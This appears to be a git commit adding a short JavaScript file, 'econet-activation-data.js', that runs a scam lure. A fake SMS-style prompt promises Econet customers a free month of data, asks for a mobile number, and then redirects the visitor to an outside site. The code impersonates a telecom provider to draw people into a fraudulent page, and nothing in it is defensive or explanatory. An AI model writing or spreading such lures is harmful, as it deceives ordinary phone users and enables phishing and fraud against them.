1b58f5747cb8cd9eb867e03f0222c5f84f336b53
sweet16palz-hub <sweet16palz@gmail.com>
2026-02-07 09:11:54 +0100

    Create econet-activation-data.js

---
+++ econet-activation-data.js
@@ -0,0 +1,5 @@
+var password = '1 MONTH FREE DATA'
+password=prompt('SMS: Congratulations, your Econet Number is eligible to receive 1 Month Free Data, click OK to Enter Your Mobile Number','1 MONTH FREE DATA');
+if (password != '1 MONTH FREE DATA') {
+location.href='https://gbamz.com/strive-birthday.html';
+}
